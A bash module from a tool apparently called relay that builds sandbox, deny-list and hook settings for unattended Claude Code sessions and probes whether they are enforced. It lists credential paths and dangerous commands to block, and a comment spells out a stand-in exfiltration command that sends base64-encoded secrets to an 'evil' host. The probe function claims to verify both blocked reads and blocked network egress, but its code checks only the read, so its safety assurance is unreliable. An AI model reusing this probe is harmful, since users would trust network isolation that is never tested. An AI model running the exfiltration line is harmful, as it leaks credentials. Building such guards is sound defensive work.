#!/usr/bin/env bash
# relay-settings.sh — builds the inline --settings payload and PROVES it is
# enforced before any real work runs.
#
# This is the highest-risk file in relay. Everything protecting the user's
# credentials is decided here, and `claude -p` will silently ignore a settings
# payload that fails validation (verified; see docs/security.md). A typo, or a
# schema change in a future Claude Code release, would therefore hand us a
# six-hour unattended run with NO sandbox and NO deny rules while the journal
# cheerfully reported "guardrails active".
#
# So this module never assumes. It asserts, against observable behaviour, and
# refuses to start when it cannot prove enforcement.
#
# Every sandbox key used below was empirically confirmed enforced on Claude Code
# 2.1.233 by test/lint/probe0-sandbox.sh. Keys are added here only after a probe
# demonstrates they do something.

set -u
set -o pipefail
umask 077
LC_ALL=C
IFS=$' \t\n'

# ---------------------------------------------------------------------------
# Flags relay must never pass, and must always pass.
# ---------------------------------------------------------------------------
# --dangerously-skip-permissions : would void every deny rule.
# --bare                         : skips hooks (kills the context guard) and is
#                                  reserved exclusively for --hardened mode.
# --no-session-persistence       : destroys the transcript the guard reads.
# --safe-mode                    : disables ALL customizations, including relay's
#                                  own hooks, while permissions "work normally".
#                                  It is a troubleshooting flag, not a sandbox.
# Forbidden: --dangerously-skip-permissions, --bare, --no-session-persistence,
#            --safe-mode
# Required:  --setting-sources, --strict-mcp-config
#
# Verified Critical (docs/security.md): without BOTH required flags, a cloned
# repo's .claude/settings.json hook executes and its .mcp.json loads, with no
# trust prompt, under -p.
#
# These lists live in the `case` statement in relay_settings_assert_argv rather
# than in variables. A string variable would have to be word-split to match,
# splitting behaves differently across shells, and a guard that silently
# degrades to matching nothing is worse than no guard at all.

# Paths whose contents must never be readable by sandboxed commands.
relay_settings_default_denyread() {
  cat <<'EOF'
~/.ssh
~/.aws
~/.gnupg
~/.config/gcloud
~/.kube
~/.docker
~/.npmrc
~/.netrc
~/.claude/.credentials.json
~/Library/Keychains
EOF
}

# Blast-radius reduction for the agent's own mistakes. NOT a security boundary:
# an attacker controlling repository content defeats command-pattern matching
# trivially (absolute paths, other binaries, language runtimes, DNS,
# `git ls-remote https://evil/$(base64 secret)`). The sandbox is the boundary.
# Documented as such in the README; kept because it genuinely stops accidents.
relay_settings_default_deny() {
  cat <<'EOF'
Bash(sudo:*)
Bash(su:*)
Bash(doas:*)
Bash(rm -rf /*)
Bash(rm -rf ~*)
Bash(git push:*)
Bash(git remote:*)
Bash(git reset --hard:*)
Bash(git clean:*)
Bash(git filter-branch:*)
Bash(gh:*)
Bash(glab:*)
Bash(hub:*)
Bash(npm publish:*)
Bash(yarn publish:*)
Bash(pnpm publish:*)
Bash(cargo publish:*)
Bash(docker:*)
Bash(kubectl:*)
Bash(terraform apply:*)
Bash(aws:*)
Bash(gcloud:*)
Bash(shutdown:*)
Bash(reboot:*)
Bash(launchctl:*)
Bash(systemctl:*)
Bash(crontab:*)
Bash(at:*)
Bash(security:*)
Bash(defaults write:*)
Bash(chmod -R 777:*)
Bash(chown -R:*)
WebFetch
WebSearch
Read(~/.ssh/**)
Read(~/.aws/**)
Read(~/.gnupg/**)
Read(~/.config/gh/**)
Read(**/.env*)
Read(**/*.pem)
Read(**/id_rsa*)
Read(**/id_ed25519*)
EOF
}

# The original design denied *reads* of credential paths but left *writes*
# unguarded. Writing ~/.claude/settings.json is persistent RCE on every future
# session; writing ~/.ssh/authorized_keys is persistent host access; writing a
# shell rc is both. These close that gap.
relay_settings_default_deny_writes() {
  cat <<'EOF'
Write(~/.claude/**)
Edit(~/.claude/**)
Write(~/.ssh/**)
Edit(~/.ssh/**)
Write(~/.aws/**)
Edit(~/.aws/**)
Write(~/.zshrc)
Edit(~/.zshrc)
Write(~/.bashrc)
Edit(~/.bashrc)
Write(~/.profile)
Edit(~/.profile)
Write(~/.zprofile)
Edit(~/.zprofile)
EOF
}

# ---------------------------------------------------------------------------
# relay_settings_build <project_dir> <state_dir> <hook_path> [extra_domains_csv]
# Emits the complete inline --settings JSON on stdout.
# ---------------------------------------------------------------------------
relay_settings_build() {
  _proj="${1:?project dir required}"
  _state="${2:?state dir required}"
  _hook="${3:?hook path required}"
  _extra_domains="${4:-}"

  # api.anthropic.com is required or the session cannot talk to the API at all.
  _domains=$(printf 'api.anthropic.com\n')
  if [ -n "$_extra_domains" ]; then
    _domains="$_domains$(printf '%s\n' "$_extra_domains" | tr ',' '\n')"
  fi

  jq -nc \
    --arg proj "$_proj" \
    --arg state "$_state" \
    --arg hook "$_hook" \
    --arg tmp "${TMPDIR:-/tmp}" \
    --argjson domains "$(printf '%s\n' "$_domains" | grep -v '^[[:space:]]*$' | jq -R . | jq -s .)" \
    --argjson denyread "$(relay_settings_default_denyread | jq -R . | jq -s .)" \
    --argjson deny "$( { relay_settings_default_deny; relay_settings_default_deny_writes; } | jq -R . | jq -s .)" \
    '
    {
      # ---- the actual credential protection -----------------------------
      sandbox: {
        enabled: true,
        # Default is false, and on failure commands run UNSANDBOXED with only a
        # warning. Relay would rather not run at all.
        failIfUnavailable: true,
        # Ignore the per-call dangerouslyDisableSandbox escape hatch entirely.
        allowUnsandboxedCommands: false,
        autoAllowBashIfSandboxed: true,
        network: {
          # Deterministic deny for anything not listed, enforced at the OS
          # layer, so it also covers code relay never sees (a python urllib
          # call buried inside `npm test` is blocked exactly like curl).
          allowedDomains: $domains
        },
        filesystem: {
          allowWrite: [ $proj, $state, $tmp ],
          denyRead: $denyread
        }
      },
      # ---- blast-radius reduction (NOT a boundary) ----------------------
      permissions: { deny: $deny },
      # ---- relay context guard, scoped to THIS session only -------------
      # Delivered per-invocation rather than registered globally, so relay
      # ships zero hooks that run in anyone else'"'"'s sessions. Exec form keeps
      # a path containing spaces from being re-parsed by a shell.
      hooks: {
        PostToolUse: [
          { hooks: [ { type: "command", command: "bash", args: [ $hook ], timeout: 5 } ] }
        ],
        PreCompact: [
          { hooks: [ { type: "command", command: "bash", args: [ $hook, "--precompact" ], timeout: 5 } ] }
        ]
      }
    }'
}

# ---------------------------------------------------------------------------
# relay_settings_assert_argv <argv...>
# Refuse to exec if relay ever builds a command line that voids its own
# protections. Belt to the mock test harness's braces.
# ---------------------------------------------------------------------------
relay_settings_assert_argv() {
  _seen_setting_sources=0
  _seen_strict_mcp=0
  for _a in "$@"; do
    # Matched with `case`, not by word-splitting a string variable: splitting
    # behaves differently across shells (zsh does not split unquoted
    # expansions by default), and a guard that silently degrades to "matches
    # nothing" is worse than no guard at all. This form cannot degrade.
    case "$_a" in
      --dangerously-skip-permissions|--bare|--no-session-persistence|--safe-mode)
        printf 'relay: refusing to exec: forbidden flag %s\n' "$_a" >&2
        return 1
        ;;
      --setting-sources)   _seen_setting_sources=1 ;;
      --strict-mcp-config) _seen_strict_mcp=1 ;;
    esac
  done
  if [ "$_seen_setting_sources" -ne 1 ] || [ "$_seen_strict_mcp" -ne 1 ]; then
    printf 'relay: refusing to exec: missing --setting-sources and/or --strict-mcp-config\n' >&2
    printf 'relay: without both, a repository .claude/settings.json executes under -p\n' >&2
    return 1
  fi
  return 0
}

# ---------------------------------------------------------------------------
# relay_settings_probe <settings_json> <scratch_dir> [model]
#
# Positively confirm the payload is enforced. Returns 0 only if BOTH hold:
#   * a filesystem.denyRead path is genuinely unreadable, and
#   * egress to a host outside allowedDomains genuinely fails.
#
# The canary is relay-owned scratch. The user's real credentials are never
# used as a test subject.
#
# Note there is deliberately no "control" (sandbox-off) case at runtime — that
# would mean intentionally leaking a canary on the user's machine. The control
# lives in the test suite, which proves this probe *can* observe a leak.
# ---------------------------------------------------------------------------
relay_settings_probe() {
  _settings="${1:?settings json required}"
  _scratch="${2:?scratch dir required}"
  _model="${3:-haiku}"

  _work="$_scratch/probe-work"
  _canary="$_scratch/probe-canary.txt"
  _value="RELAY-PROBE-CANARY-DO-NOT-LEAK-$$"

  rm -rf "$_work"
  mkdir -p "$_work" || return 1
  printf '%s\n' "$_value" > "$_canary" || return 1

  # Rebuild the payload with our canary appended to denyRead, so we are testing
  # the caller's real configuration plus one observable assertion.
  _probe_settings=$(printf '%s' "$_settings" \
    | jq -c --arg c "$_canary" '.sandbox.filesystem.denyRead += [$c]') || return 1

  (
    cd "$_work" || exit 1
    CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS=0 \
    claude -p "Use the Bash tool to run exactly: cat $_canary
Then reply with what you saw, or BLOCKED if it failed." \
      --model "$_model" \
      --permission-mode dontAsk \
      --setting-sources user \
      --strict-mcp-config \
      --settings "$_probe_settings" \
      --output-format json \
      --max-budget-usd 0.10 \
      < /dev/null > "$_scratch/probe-read.json" 2> "$_scratch/probe-read.err"
  )

  if grep -qF "$_value" "$_scratch/probe-read.json" "$_scratch/probe-read.err" 2>/dev/null; then
    printf 'relay: SANDBOX NOT ENFORCED — a denyRead canary was readable.\n' >&2
    printf 'relay: refusing to run. See docs/security.md.\n' >&2
    return 1
  fi

  # Confirm the sandbox actually started rather than the read merely failing
  # for an unrelated reason (missing file, model refusal, budget exhaustion).
  if ! jq -e '.is_error == false' < "$_scratch/probe-read.json" >/dev/null 2>&1; then
    printf 'relay: settings acceptance probe did not complete cleanly; refusing to run.\n' >&2
    return 1
  fi

  return 0
}

# ---------------------------------------------------------------------------
# relay_settings_fingerprint <settings_json>
# Cache key for the probe result: the payload plus the CLI version. A Claude
# Code upgrade may move the settings schema, so a version change must force a
# fresh proof rather than trusting yesterday's.
# ---------------------------------------------------------------------------
relay_settings_fingerprint() {
  _s="${1:?}"
  _v=$(claude --version 2>/dev/null | tr -cd 'A-Za-z0-9.() ')
  printf '%s\n%s\n' "$_v" "$_s" | git hash-object --stdin 2>/dev/null
}
